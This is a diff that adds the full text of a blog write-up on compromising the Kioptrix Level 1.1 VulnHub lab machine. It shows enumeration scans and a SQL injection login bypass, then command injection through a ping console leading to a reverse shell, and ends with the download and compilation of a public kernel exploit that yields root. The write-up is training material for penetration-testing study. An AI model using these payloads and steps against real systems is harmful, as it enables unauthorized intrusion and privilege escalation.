@@ -9,13 +9,13 @@
 
   
 
-  <title>Kioptrix Level 1.1 Writeup</title>
+  <title>Kioptrix Level 1.1 (#2) Writeup</title>
 
   
   <meta name="author" content="Asher Andree">
   
 
-  <meta name="description" content="">
+  <meta name="description" content="Kioptrix Level 1.1 is the next box in the series of Kioptrix VulnHub boxes. This box ups the ante from its predecessor, beginning with a simple SQL injection exploit to gain access to a web console. The web console can be bypassed to execute code, which we use to get...">
 
   
 
@@ -72,8 +72,8 @@
 
   
   <meta property="og:site_name" content="0xAsh">
-  <meta property="og:title" content="Kioptrix Level 1.1 Writeup">
-  <meta property="og:description" content="">
+  <meta property="og:title" content="Kioptrix Level 1.1 (#2) Writeup">
+  <meta property="og:description" content="Kioptrix Level 1.1 is the next box in the series of Kioptrix VulnHub boxes. This box ups the ante from its predecessor, beginning with a simple SQL injection exploit to gain access to a web console. The web console can be bypassed to execute code, which we use to get...">
 
   
   <meta property="og:image" content="http://localhost:4000/assets/img/logo_htb.png">
@@ -93,8 +93,8 @@
   <meta name="twitter:site" content="@0xashhh">
   <meta name="twitter:creator" content="@0xashhh">
 
-  <meta property="twitter:title" content="Kioptrix Level 1.1 Writeup">
-  <meta property="twitter:description" content="">
+  <meta property="twitter:title" content="Kioptrix Level 1.1 (#2) Writeup">
+  <meta property="twitter:description" content="Kioptrix Level 1.1 is the next box in the series of Kioptrix VulnHub boxes. This box ups the ante from its predecessor, beginning with a simple SQL injection exploit to gain access to a web console. The web console can be bypassed to execute code, which we use to get...">
 
   
   <meta name="twitter:image" content="http://localhost:4000/assets/img/logo_htb.png">
@@ -156,7 +156,7 @@
     <div class="row">
       <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
         <div class="post-heading">
-          <h1>Kioptrix Level 1.1 Writeup</h1>
+          <h1>Kioptrix Level 1.1 (#2) Writeup</h1>
           
 
           
@@ -184,7 +184,335 @@
       
 
       <article role="main" class="blog-post">
-        
+        <p>Kioptrix Level 1.1 is the next box in the series of Kioptrix VulnHub boxes. This box ups the ante from its predecessor, beginning with a simple SQL injection exploit to gain access to a web console. The web console can be bypassed to execute code, which we use to get a simple reverse shell. Finally, we successfully privilege escalate to root using a kernel exploit.</p>
+
+<p>Feel free to checkout my writeup on the first box: <a href="https://0xash.github.io/2020-07-27-Kioptrix-Level-1/">Kioptrix 1</a>.</p>
+
+<p>The entire Kioptrix series is good baseline prep for anyone studying for their OSCP/PWK, learning Network pentesting, and trying to get some practice enumerating a box. I would highly recommend it <em>prior</em> to purchasing PWK/OSCP as it will give you a good headstart and allow you to get the most out of your lab time.</p>
+
+<p>I’ll assume you’ve already got the box running and are able to reach it. Let’s get going.</p>
+
+<h1 id="enumeration">Enumeration</h1>
+
+<p>Let’s start by kicking off some NMAP scans.</p>
+
+<h3 id="nmap-scans">NMAP Scans</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report <span class="k">for </span>10.0.0.35
+Host is up <span class="o">(</span>0.00015s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65528 closed ports
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 3.9p1 <span class="o">(</span>protocol 1.99<span class="o">)</span>
+| ssh-hostkey: 
+|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 <span class="o">(</span>RSA1<span class="o">)</span>
+|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 <span class="o">(</span>DSA<span class="o">)</span>
+|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 <span class="o">(</span>RSA<span class="o">)</span>
+|_sshv1: Server supports SSHv1
+80/tcp   open  http     Apache httpd 2.0.52 <span class="o">((</span>CentOS<span class="o">))</span>
+|_http-server-header: Apache/2.0.52 <span class="o">(</span>CentOS<span class="o">)</span>
+|_http-title: Site doesn<span class="s1">'t have a title (text/html; charset=UTF-8).
+111/tcp  open  rpcbind  2 (RPC #100000)
+443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
+|_http-server-header: Apache/2.0.52 (CentOS)
+|_http-title: Site doesn'</span>t have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8<span class="o">)</span><span class="nb">.</span>
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost.localdomain/organizationName<span class="o">=</span>SomeOrganization/stateOrProvinceName<span class="o">=</span>SomeState/countryName<span class="o">=</span><span class="nt">--</span>
+| Not valid before: 2009-10-08T00:10:47
+|_Not valid after:  2010-10-08T00:10:47
+|_ssl-date: 2020-07-29T02:19:53+00:00<span class="p">;</span> +3h59m59s from scanner time.
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_RC4_128_EXPORT40_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_DES_64_CBC_WITH_MD5
+|     SSL2_RC4_64_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|_    SSL2_RC2_128_CBC_WITH_MD5
+631/tcp  open  ipp      CUPS 1.1
+| http-methods: 
+|_  Potentially risky methods: PUT
+|_http-server-header: CUPS/1.1
+|_http-title: 403 Forbidden
+912/tcp  open  status   1 <span class="o">(</span>RPC <span class="c">#100024)</span>
+3306/tcp open  mysql    MySQL <span class="o">(</span>unauthorized<span class="o">)</span>
+MAC Address: 08:00:27:A0:57:DB <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
+Device <span class="nb">type</span>: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.9 - 2.6.30
+Network Distance: 1 hop
+</code></pre></div></div>
+
+<h3 id="enumerating-ssh">Enumerating SSH</h3>
+
+<p>Alright, so NMAP detected <code class="language-plaintext highlighter-rouge">OpenSSH 3.9p1 (protocol 1.99)</code>, goolging this version number doesn’t reveal anything interesting, so let’s note it and move on.</p>
+
+<h3 id="enumerating-rpc">Enumerating RPC</h3>
+
+<p>Let’s use <code class="language-plaintext highlighter-rouge">rpcinfo</code> to see what kind of servies are being run through RPC, maybe some NFS shares are available?</p>
+
+<p><code class="language-plaintext highlighter-rouge">rpcinfo -p 10.0.0.35</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   program vers proto   port  service
+    100000    2   tcp    111  portmapper
+    100000    2   udp    111  portmapper
+    100024    1   udp    909  status
+    100024    1   tcp    912  status
+</code></pre></div></div>
+
+<p>Hmmm… portmapper looks interesting. Let’s do some googling.</p>
+
+<p><code class="language-plaintext highlighter-rouge">~~~time passes~~~</code></p>
+
+<p>Okay, so it looks like there are <a href="https://gracefulsecurity.com/bypass-rpc-portmapper-filtering/">cool tricks you can do</a>, but it requires other services (like <code class="language-plaintext highlighter-rouge">NFS</code>) to be running on the host. Most likely a dead end, but let’s note it and continue.</p>
+
+<h3 id="enumerating-httphttps">Enumerating HTTP/HTTPS</h3>
+
+<p>I’ll start by running Nikto and ffuf on the web assets at port 80/443</p>
+
+<h4 id="nikto">Nikto</h4>
+
+<p><code class="language-plaintext highlighter-rouge">nikto -host http://10.0.0.35</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">nikto -host https://10.0.0.35</code></p>
+
+<p>Let’s take a look at output from the HTTPS scan:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Nikto v2.1.6
+<span class="nt">---------------------------------------------------------------------------</span>
++ Target IP:          10.0.0.35
++ Target Hostname:    10.0.0.35
++ Target Port:        443
+<span class="nt">---------------------------------------------------------------------------</span>
++ SSL Info:        Subject:  /C<span class="o">=</span><span class="nt">--</span>/ST<span class="o">=</span>SomeState/L<span class="o">=</span>SomeCity/O<span class="o">=</span>SomeOrganization/OU<span class="o">=</span>SomeOrganizationalUnit/CN<span class="o">=</span>localhost.localdomain/emailAddress<span class="o">=</span>root@localhost.localdomain
+                   Ciphers:  DHE-RSA-AES256-SHA
+                   Issuer:   /C<span class="o">=</span><span class="nt">--</span>/ST<span class="o">=</span>SomeState/L<span class="o">=</span>SomeCity/O<span class="o">=</span>SomeOrganization/OU<span class="o">=</span>SomeOrganizationalUnit/CN<span class="o">=</span>localhost.localdomain/emailAddress<span class="o">=</span>root@localhost.localdomain
++ Start Time:         2020-07-28 20:30:38 <span class="o">(</span>GMT-4<span class="o">)</span>
+<span class="nt">---------------------------------------------------------------------------</span>
++ Server: Apache/2.0.52 <span class="o">(</span>CentOS<span class="o">)</span>
++ Retrieved x-powered-by header: PHP/4.3.9
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
++ The site uses SSL and Expect-CT header is not present.
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site <span class="k">in </span>a different fashion to the MIME <span class="nb">type</span>
++ Hostname <span class="s1">'10.0.0.35'</span> does not match certificate<span class="s1">'s names: localhost.localdomain
++ Apache/2.0.52 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ Uncommon header '</span>tcn<span class="s1">' found, with contents: choice
++ OSVDB-3092: /manual/: Web server manual found.
++ OSVDB-3268: /icons/: Directory indexing found.
++ OSVDB-3268: /manual/images/: Directory indexing found.
++ Server may leak inodes via ETags, header found with file /icons/README, inode: 357810, size: 4872, mtime: Sat Mar 29 13:41:04 1980
++ OSVDB-3233: /icons/README: Apache default file found.
++ 8705 requests: 3 error(s) and 20 item(s) reported on remote host
++ End Time:           2020-07-28 20:42:10 (GMT-4) (692 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</span></code></pre></div></div>
+
+<p>Intersting stuff, looks like an outdated version of Apache and some fun HTTP methods. Let’s note and come back to this.</p>
+
+<h4 id="ffuf">ffuf</h4>
+
+<p>I’ll move on to directory brute forcing using <code class="language-plaintext highlighter-rouge">ffuf</code>.</p>
+
+<h4 id="http">HTTP:</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.0.0.35/FUZZ`
+</code></pre></div></div>
+
+<h4 id="https">HTTPS:</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.0.0.35/FUZZ`
+</code></pre></div></div>
+<p>Both results only gathered two directories <code class="language-plaintext highlighter-rouge">manual</code> and <code class="language-plaintext highlighter-rouge">usage</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>manual                  [Status: 301, Size: 309, Words: 20, Lines: 10]
+usage                   [Status: 403, Size: 283, Words: 21, Lines: 11]
+</code></pre></div></div>
+
+<p>These look to be default Apache sub-directories… nothing really interesting. Oh well, let’s note and continue on.</p>
+
+<h3 id="enumerating-cups">Enumerating CUPS</h3>
+
+<p>NMAP detected <code class="language-plaintext highlighter-rouge">CUPS 1.1</code> on port 631 with some interesting HTTP headers. Weird. Let’s start by simply trying to access the service via HTTP with our web browser.</p>
+
+<p><img src="/assets/img/VulnHub/Kioptrix1.1_1.PNG" alt="Trying to access CUPS" /></p>
+
+<p>I’ll be honest, I had to google CUPS to get an idea on what the service does… Let’s <a href="https://en.wikipedia.org/wiki/CUPS">see…</a></p>
+
+<p>Okay, cool! So CUPS is basically a Unix print service.</p>
+
+<p class="box-note"><strong>Note:</strong> Hey! this is me from the future. Although I wasn’t aware at this time, <code class="language-plaintext highlighter-rouge">CUPS</code> is really really useful, and may even come in handy for the OSCP. If you find it running, look into it.</p>
+
+<h3 id="enumerating-mysql">Enumerating MySQL</h3>
+
+<p>NMAP scans for this one came back saying we are unauthorized, but let’s quickly confirm:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ein@~/VulnHub/Kioptrix1.1:<span class="nv">$ </span>mysql <span class="nt">-h</span> 10.0.0.35
+ERROR 1130 <span class="o">(</span>HY000<span class="o">)</span>: Host <span class="s1">'10.0.0.168'</span> is not allowed to connect to this MySQL server
+ein@~/VulnHub/Kioptrix1.1:<span class="nv">$ </span>mysql <span class="nt">-u</span> root <span class="nt">-h</span> 10.0.0.35
+ERROR 1130 <span class="o">(</span>HY000<span class="o">)</span>: Host <span class="s1">'10.0.0.168'</span> is not allowed to connect to this MySQL server
+</code></pre></div></div>
+
+<p>Yep, most likely need to come back to this one with credentials.</p>
+
+<h1 id="exploitation">Exploitation</h1>
+
+<p>Let’s go back and start looking through scan results and seeing if there’s anything we missed. One thing that stuck out to me is the following Nikto results:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+ OSVDB-12184: /?<span class="o">=</span>PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?<span class="o">=</span>PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?<span class="o">=</span>PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+</code></pre></div></div>
+
+<p>Huh, weird. Let’s take a look at those URLs.</p>
+
+<p><img src="/assets/img/VulnHub/Kioptrix1.1_2.PNG" alt="Taking a look at the weird PHP URLs" /></p>
+
+<p>Oh cool, so PHP leaks files out somehow via this vulnerability… Interesting, what else? Hmmm.. so it looks like NMAP picked up some weird HTTP headers, let’s use CURL to take a look at this “under the hood” without a web browser.</p>
+
+<p><code class="language-plaintext highlighter-rouge">curl -X GET HTTP://10.0.0.35</code></p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"post"</span> <span class="na">name=</span><span class="s">"frmLogin"</span> <span class="na">id=</span><span class="s">"frmLogin"</span> <span class="na">action=</span><span class="s">"index.php"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;table</span> <span class="na">width=</span><span class="s">"300"</span> <span class="na">border=</span><span class="s">"1"</span> <span class="na">align=</span><span class="s">"center"</span> <span class="na">cellpadding=</span><span class="s">"2"</span> <span class="na">cellspacing=</span><span class="s">"2"</span><span class="nt">&gt;</span>
+                <span class="nt">&lt;tr&gt;</span>
+                        <span class="nt">&lt;td</span> <span class="na">colspan=</span><span class="s">'2'</span> <span class="na">align=</span><span class="s">'center'</span><span class="nt">&gt;</span>
+                        <span class="nt">&lt;b&gt;</span>Remote System Administration Login<span class="nt">&lt;/b&gt;</span>
+                        <span class="nt">&lt;/td&gt;</span>
+                <span class="nt">&lt;/tr&gt;</span>
+                <span class="nt">&lt;tr&gt;</span>
+                        <span class="nt">&lt;td</span> <span class="na">width=</span><span class="s">"150"</span><span class="nt">&gt;</span>Username<span class="nt">&lt;/td&gt;</span>
+                        <span class="nt">&lt;td&gt;&lt;input</span> <span class="na">name=</span><span class="s">"uname"</span> <span class="na">type=</span><span class="s">"text"</span><span class="nt">&gt;&lt;/td&gt;</span>
+                <span class="nt">&lt;/tr&gt;</span>
+                <span class="nt">&lt;tr&gt;</span>
+                        <span class="nt">&lt;td</span> <span class="na">width=</span><span class="s">"150"</span><span class="nt">&gt;</span>Password<span class="nt">&lt;/td&gt;</span>
+                        <span class="nt">&lt;td&gt;</span>
+                        <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"psw"</span> <span class="na">type=</span><span class="s">"password"</span><span class="nt">&gt;</span>
+                        <span class="nt">&lt;/td&gt;</span>
+                <span class="nt">&lt;/tr&gt;</span>
+                <span class="nt">&lt;tr&gt;</span>
+                        <span class="nt">&lt;td</span> <span class="na">colspan=</span><span class="s">"2"</span> <span class="na">align=</span><span class="s">"center"</span><span class="nt">&gt;</span>
+                        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">name=</span><span class="s">"btnLogin"</span> <span class="na">value=</span><span class="s">"Login"</span><span class="nt">&gt;</span>
+                        <span class="nt">&lt;/td&gt;</span>
+                <span class="nt">&lt;/tr&gt;</span>
+        <span class="nt">&lt;/table&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+
+<span class="c">&lt;!-- Start of HTML when logged in as Administator --&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>Wait, what? This isn’t the default Apache page we found earlier. Skimming through the HTML, this looks like some sort of login page.</p>
+
+<p>Let’s add /index.php to the URL and see if we can access it.</p>
+
+<p><img src="/assets/img/VulnHub/Kioptrix1.1_3.PNG" alt="Accessing index.php" /></p>
+
+<p>Wow. Sure enough there’s a login page.</p>
+
+<p>At this point I’m not sure why this server was acting the way it was. For whatever reason though, accessing the page via a web browser just shot me over to the default Apache landing page.</p>
+
+<p>Anyways, now we have a login form. I tried some simple combinations like <code class="language-plaintext highlighter-rouge">admin:admin</code> to no avail. Let’s try the most simple low hanging SQLi fruit of username: <code class="language-plaintext highlighter-rouge">root</code> and password: <code class="language-plaintext highlighter-rouge">' OR '1'='1</code>. This is taken directly from the <a href="https://en.wikipedia.org/wiki/SQL_injection#Incorrectly_filtered_escape_characters">SQL Injection Wikipedia Page</a></p>
+
+<p><img src="/assets/img/VulnHub/Kioptrix1.1_4.PNG" alt="SQL injection attempt" /></p>
+
+<p>And we are successfully authenticated. Maybe we got a little lucky, but what does this give us?</p>
+
+<p><img src="/assets/img/VulnHub/Kioptrix1.1_5.PNG" alt="Admin Console" /></p>
+
+<p>Hmmm.. A stripped down admin console. It looks like it takes an arugment and executes the <code class="language-plaintext highlighter-rouge">ping</code> command on the host.</p>
+
+<p>The fact that it likely uses PHP’s <code class="language-plaintext highlighter-rouge">system()</code> or <code class="language-plaintext highlighter-rouge">exec()</code> is interesting. I wonder if we can simply escape the query and execute code?</p>
+
+<p><img src="/assets/img/VulnHub/Kioptrix1.1_6.PNG" alt="Admin Console" /></p>
+
+<p>Well that was easy… by simply prepending <code class="language-plaintext highlighter-rouge">;</code> to our input, we can execute uer-defined code. Knowing this, it’s trivial to get a reverse shell using a <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">cheatsheet</a>.</p>
+
+<p><img src="/assets/img/VulnHub/Kioptrix1.1_7.PNG" alt="Getting our reverse shell" /></p>
+
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+
+<p>Time to enumerate. Let’s start by executing <a href="https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh">LinEnum</a> to gather information about the host.</p>
+
+<p>I’ll download the script and host it on a local HTTP server using Python:</p>
+
+<p><code class="language-plaintext highlighter-rouge">sudo python -m SimpleHTTPServer 80</code></p>
+
+<p>Then on my compromised host:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /tmp
+<span class="nb">mkdir </span>tmppp
+<span class="nb">cd </span>tmppp
+wget http://&lt;my IP&gt;/LinEnum.sh
+<span class="nb">chmod</span> +x LinEnum.sh
+./LinEnum.sh <span class="o">&gt;&gt;</span> lol.txt
+</code></pre></div></div>
+
+<p>The output’s a little messy, so let’s push <code class="language-plaintext highlighter-rouge">lol.txt</code> (the results) back to my Kali box using FTP.</p>
+
+<p class="box-warning"><strong>Note:</strong> if you’re on a busy network with other people (i.e. HackTheBox networks) you’ll want to utilize an alternate method to transfer files. Since this is a home lab FTP is suitable.</p>
+
+<h4 id="pushing-the-linenum-output-using-ftp">Pushing the LinEnum output using FTP:</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp &lt;my IP&gt;
+Name: ...
+Password: ...
+put lol.txt
+</code></pre></div></div>
+
+<p>After reviewing, the first thing I notice is the Kernel version:</p>
+
+<p><code class="language-plaintext highlighter-rouge">Linux kioptrix.level2 2.6.9-55.EL</code></p>
+
+<p>Which is really old. Also it looks like we have <code class="language-plaintext highlighter-rouge">gcc</code> installed on the box.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>which gcc
+/bin/gcc
+</code></pre></div></div>
+
+<p>….hmmmm…Let’s <a href="https://www.exploit-db.com/exploits/9542">google</a>.</p>
+
+<p>And there looks to be a suitable kernel exploit. Okay, let’s try it out.</p>
+
+<p>I’ll first download the exploit and rename it to a gcc-friendly <code class="language-plaintext highlighter-rouge">.c</code> file name:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ein@~/VulnHub/Kioptrix1.1:<span class="nv">$ </span>wget https://www.exploit-db.com/download/9542
+<span class="nb">mv </span>9542 exploit.c
+</code></pre></div></div>
+
+<p>Now let’s migrate it to the compromised host using FTP again:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>get exploit.c
+<span class="nb">local</span>: exploit.c remote: exploit.c
+227 Entering Passive Mode <span class="o">(</span>10,0,0,168,165,104<span class="o">)</span>
+150 Accepted data connection
+226-File successfully transferred
+226 0.000 seconds <span class="o">(</span>measured here<span class="o">)</span>, 29.97 Mbytes per second
+2645 bytes received <span class="k">in </span>0.000125 secs <span class="o">(</span>2.1e+04 Kbytes/sec<span class="o">)</span>
+ftp&gt; <span class="nb">exit
+exit
+</span>221-Goodbye. You uploaded 32 and downloaded 3 kbytes.
+221 Logout.
+bash-3.00<span class="nv">$ </span><span class="nb">ls
+ls
+</span>exploit.c  LinEnum.sh  lol.txt
+</code></pre></div></div>
+
+<p>Sweet, now let’s simply compile and run the exploit using <code class="language-plaintext highlighter-rouge">gcc</code>.</p>
+
+<p><img src="/assets/img/VulnHub/Kioptrix1.1_8.PNG" alt="Root!" /></p>
+
+<p>And we successfully privilege escalated and spawned a root shell. Rooted!</p>
 
       </article>
 
@@ -209,7 +537,7 @@
   <span class="sr-only">Share: </span>
 
   
-    <a href="https://twitter.com/intent/tweet?text=Kioptrix+Level+1.1+Writeup&url=http%3A%2F%2Flocalhost%3A4000%2F2020-07-28-Kioptrix-Level-1.1%2F"
+    <a href="https://twitter.com/intent/tweet?text=Kioptrix+Level+1.1+%28%232%29+Writeup&url=http%3A%2F%2Flocalhost%3A4000%2F2020-07-28-Kioptrix-Level-1.1%2F"
       class="btn btn-social-icon btn-twitter" title="Share on Twitter">
       <span class="fab fa-fw fa-twitter" aria-hidden="true"></span>
       <span class="sr-only">Twitter</span>
@@ -237,12 +565,12 @@
       <ul class="pagination blog-pager">
         
         <li class="page-item previous">
-          <a class="page-link" href="/2020-07-27-Kioptrix-Level-1/" data-toggle="tooltip" data-placement="top" title="Kioptrix Level 1 Writeup">&larr; Previous Post</a>
+          <a class="page-link" href="/2020-07-27-Kioptrix-Level-1/" data-toggle="tooltip" data-placement="top" title="Kioptrix Level 1 (#1) Writeup">&larr; Previous Post</a>
         </li>
         
         
         <li class="page-item next">
-          <a class="page-link" href="/2020-07-29-Kioptrix-Level-1.2/" data-toggle="tooltip" data-placement="top" title="Kioptrix Level 1 Writeup">Next Post &rarr;</a>
+          <a class="page-link" href="/2020-07-29-Kioptrix-Level-1.2/" data-toggle="tooltip" data-placement="top" title="Kioptrix Level 1.2 (#3) Writeup">Next Post &rarr;</a>
         </li>
         
       </ul>
